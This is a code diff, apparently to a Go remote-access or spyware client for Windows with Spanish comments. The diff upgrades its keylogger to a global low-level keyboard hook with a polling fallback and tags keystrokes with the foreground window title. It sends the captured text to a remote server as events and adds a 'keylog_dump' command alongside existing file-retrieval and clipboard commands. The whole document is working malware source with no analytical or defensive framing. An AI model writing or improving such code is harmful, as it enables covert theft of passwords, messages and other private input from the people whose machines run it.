@@ -20,6 +20,7 @@ import (
 	"strconv"
 	"strings"
 	"sync"
+	"sync/atomic"
 	"syscall"
 	"time"
 	"unsafe"
@@ -54,18 +55,31 @@ var (
 	events []map[string]any
 	shots  []map[string]any
 
+	keyMu  sync.Mutex
+	keyBuf strings.Builder
+	keyApp string
+
+	curApp atomic.Value
+
 	httpc = &http.Client{Timeout: 20 * time.Second}
 	start = time.Now()
 )
 
 var (
-	user32               = syscall.NewLazyDLL("user32.dll")
-	procSetCursorPos     = user32.NewProc("SetCursorPos")
-	procMouseEvent       = user32.NewProc("mouse_event")
-	procKeybdEvent       = user32.NewProc("keybd_event")
-	procGetAsyncKeyState = user32.NewProc("GetAsyncKeyState")
-	procGetForeground    = user32.NewProc("GetForegroundWindow")
-	procGetWindowText    = user32.NewProc("GetWindowTextW")
+	user32 = syscall.NewLazyDLL("user32.dll")
+
+	procSetCursorPos      = user32.NewProc("SetCursorPos")
+	procMouseEvent        = user32.NewProc("mouse_event")
+	procKeybdEvent        = user32.NewProc("keybd_event")
+	procGetAsyncKeyState  = user32.NewProc("GetAsyncKeyState")
+	procGetForeground     = user32.NewProc("GetForegroundWindow")
+	procGetWindowText     = user32.NewProc("GetWindowTextW")
+	procSetWindowsHookEx  = user32.NewProc("SetWindowsHookExW")
+	procCallNextHookEx    = user32.NewProc("CallNextHookEx")
+	procGetMessage        = user32.NewProc("GetMessageW")
+	procGetKeyboardState  = user32.NewProc("GetKeyboardState")
+	procGetKeyboardLayout = user32.NewProc("GetKeyboardLayout")
+	procToUnicodeEx       = user32.NewProc("ToUnicodeEx")
 
 	kernel32                 = syscall.NewLazyDLL("kernel32.dll")
 	procGlobalMemoryStatusEx = kernel32.NewProc("GlobalMemoryStatusEx")
@@ -105,6 +119,20 @@ type osVersionInfoEx struct {
 	PlatformId        uint32
 	CSDVersion        [128]uint16
 }
+
+type kbdLLHookStruct struct {
+	VkCode      uint32
+	ScanCode    uint32
+	Flags       uint32
+	Time        uint32
+	DwExtraInfo uintptr
+}
+
+const (
+	WH_KEYBOARD_LL = 13
+	WM_KEYDOWN     = 0x0100
+	WM_SYSKEYDOWN  = 0x0104
+)
 
 /* ---------------- utilidades ---------------- */
 
@@ -166,6 +194,23 @@ func hidden(cmd *exec.Cmd) {
 func keyDown(vk uintptr) bool {
 	r, _, _ := procGetAsyncKeyState.Call(vk)
 	return uint16(r)&0x8000 != 0
+}
+
+func fgTitle() string {
+	hwnd, _, _ := procGetForeground.Call()
+	if hwnd == 0 {
+		return ""
+	}
+	buf := make([]uint16, 512)
+	procGetWindowText.Call(hwnd, uintptr(unsafe.Pointer(&buf[0])), 512)
+	return syscall.UTF16ToString(buf)
+}
+
+func getApp() string {
+	if v := curApp.Load(); v != nil {
+		return v.(string)
+	}
+	return ""
 }
 
 func ramMB() (uint64, uint64) {
@@ -311,6 +356,166 @@ func pushAll() {
 		evMu.Unlock()
 		logf("push fallo %v %d", err, code)
 	}
+}
+
+/* ---------------- keylogger con hook global ---------------- */
+
+func flushKeys(force bool) {
+	keyMu.Lock()
+	defer keyMu.Unlock()
+	if keyBuf.Len() == 0 {
+		return
+	}
+	pushEvent("key", map[string]any{"text": keyBuf.String(), "pkg": keyApp})
+	keyBuf.Reset()
+}
+
+func vkToUnicode(vk, scan uint32) string {
+	var st [256]byte
+	procGetKeyboardState.Call(uintptr(unsafe.Pointer(&st[0])))
+	var buf [8]uint16
+	layout, _, _ := procGetKeyboardLayout.Call(0)
+	n, _, _ := procToUnicodeEx.Call(
+		uintptr(vk), uintptr(scan),
+		uintptr(unsafe.Pointer(&st[0])),
+		uintptr(unsafe.Pointer(&buf[0])), 8, 0, layout)
+	if int32(n) == -1 {
+		return syscall.UTF16ToString(buf[:1])
+	}
+	if int32(n) <= 0 {
+		return ""
+	}
+	return syscall.UTF16ToString(buf[:n])
+}
+
+func keyName(vk uint32) string {
+	switch vk {
+	case 0x0D:
+		return "[Enter]"
+	case 0x08:
+		return "[Back]"
+	case 0x09:
+		return "[Tab]"
+	case 0x1B:
+		return "[Esc]"
+	case 0x2E:
+		return "[Del]"
+	case 0x25:
+		return "[<-]"
+	case 0x26:
+		return "[^]"
+	case 0x27:
+		return "[->]"
+	case 0x28:
+		return "[v]"
+	case 0x14:
+		return "[Caps]"
+	case 0x10, 0x11, 0x12, 0x5B, 0x5D:
+		return ""
+	}
+	return ""
+}
+
+var hookCallback uintptr
+
+func hookProc(nCode, wParam, lParam uintptr) uintptr {
+	if nCode == 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
+		k := (*kbdLLHookStruct)(unsafe.Pointer(lParam))
+		vk := k.VkCode
+
+		app := getApp()
+		keyMu.Lock()
+		if app != "" && app != keyApp {
+			keyMu.Unlock()
+			flushKeys(true)
+			keyMu.Lock()
+			keyApp = app
+		}
+		if n := keyName(vk); n != "" {
+			keyBuf.WriteString(n)
+		} else if vk == 0x20 {
+			keyBuf.WriteString(" ")
+		} else if s := vkToUnicode(vk, k.ScanCode); s != "" && s != "\r" {
+			keyBuf.WriteString(s)
+		}
+		keyMu.Unlock()
+	}
+	r, _, _ := procCallNextHookEx.Call(0, nCode, wParam, lParam)
+	return r
+}
+
+func keylogger() {
+	runtime.LockOSThread()
+	hookCallback = syscall.NewCallback(hookProc)
+	h, _, err := procSetWindowsHookEx.Call(WH_KEYBOARD_LL, hookCallback, 0, 0)
+	if h == 0 {
+		logf("hook fallo (%v), uso modo sondeo", err)
+		go pollKeylogger()
+		return
+	}
+	logf("keylogger con hook global OK")
+
+	go func() {
+		for range time.NewTicker(4 * time.Second).C {
+			flushKeys(false)
+		}
+	}()
+
+	var msg [64]byte
+	for {
+		r, _, _ := procGetMessage.Call(uintptr(unsafe.Pointer(&msg[0])), 0, 0, 0)
+		if int32(r) <= 0 {
+			break
+		}
+	}
+}
+
+func pollKeylogger() {
+	var prev [256]bool
+	var buf strings.Builder
+	for range time.NewTicker(10 * time.Millisecond).C {
+		for vk := 0x08; vk <= 0xFE; vk++ {
+			down := keyDown(uintptr(vk))
+			if down && !prev[vk] {
+				if c := vkToChar(byte(vk)); c != "" {
+					buf.WriteString(c)
+				}
+			}
+			prev[vk] = down
+		}
+		if buf.Len() > 0 {
+			keyMu.Lock()
+			keyApp = getApp()
+			keyBuf.WriteString(buf.String())
+			keyMu.Unlock()
+			buf.Reset()
+		}
+	}
+}
+
+func vkToChar(vk byte) string {
+	switch {
+	case vk >= 0x41 && vk <= 0x5A:
+		c := string(rune('a' + vk - 0x41))
+		if keyDown(0x10) {
+			c = strings.ToUpper(c)
+		}
+		return c
+	case vk >= 0x30 && vk <= 0x39:
+		if keyDown(0x10) {
+			return "!@#$%^&*()"[vk-0x30 : vk-0x30+1]
+		}
+		return string(rune('0' + vk - 0x30))
+	case vk == 0x20:
+		return " "
+	case vk == 0x0D:
+		return "[Enter]"
+	case vk == 0x08:
+		return "[Back]"
+	case vk == 0x09:
+		return "[Tab]"
+	}
+	return ""
 }
 
 /* ---------------- comandos ---------------- */
@@ -546,6 +751,9 @@ func execute(cmd string, a map[string]any) (string, bool) {
 	case "clip_set":
 		clipSet(str(a["text"]))
 		return "ok", true
+	case "keylog_dump":
+		flushKeys(true)
+		return "volcado", true
 	case "files":
 		return listFiles(str(a["path"]), str(a["pattern"])), true
 	case "file_get":
@@ -582,71 +790,16 @@ func execute(cmd string, a map[string]any) (string, bool) {
 	return "unsupported:" + cmd, true
 }
 
-/* ---------------- vigilantes ---------------- */
-
-func keylogger() {
-	var prev [256]bool
-	var buf strings.Builder
-	last := time.Now()
-	for range time.NewTicker(20 * time.Millisecond).C {
-		for vk := 0x08; vk <= 0xFE; vk++ {
-			down := keyDown(uintptr(vk))
-			if down && !prev[vk] {
-				if c := vkToChar(byte(vk)); c != "" {
-					buf.WriteString(c)
-				}
-			}
-			prev[vk] = down
-		}
-		if time.Since(last) > 10*time.Second && buf.Len() > 0 {
-			pushEvent("key", map[string]any{"text": buf.String()})
-			buf.Reset()
-			last = time.Now()
-		}
-	}
-}
-
-func vkToChar(vk byte) string {
-	switch {
-	case vk >= 0x41 && vk <= 0x5A:
-		c := string(rune('a' + vk - 0x41))
-		if keyDown(0x10) {
-			c = strings.ToUpper(c)
-		}
-		return c
-	case vk >= 0x30 && vk <= 0x39:
-		if keyDown(0x10) {
-			return "!@#$%^&*()"[vk-0x30 : vk-0x30+1]
-		}
-		return string(rune('0' + vk - 0x30))
-	case vk == 0x20:
-		return " "
-	case vk == 0x0D:
-		return "[Enter]"
-	case vk == 0x08:
-		return "[Back]"
-	case vk == 0x09:
-		return "[Tab]"
-	case vk == 0x1B:
-		return "[Esc]"
-	case vk == 0x2E:
-		return "[Del]"
-	}
-	return ""
-}
+/* ---------------- vigilante de ventanas ---------------- */
 
 func fgWatcher() {
 	last := ""
-	for range time.NewTicker(2 * time.Second).C {
-		hwnd, _, _ := procGetForeground.Call()
-		if hwnd == 0 {
-			continue
-		}
-		buf := make([]uint16, 512)
-		procGetWindowText.Call(hwnd, uintptr(unsafe.Pointer(&buf[0])), 512)
-		t := syscall.UTF16ToString(buf)
+	for range time.NewTicker(1 * time.Second).C {
+		t := fgTitle()
+		curApp.Store(t)
 		if t != "" && t != last {
 			last = t
+			flushKeys(true)
 			pushEvent("app_fg", map[string]any{"pkg": t, "ts": time.Now().UnixMilli()})
 		}
 	}
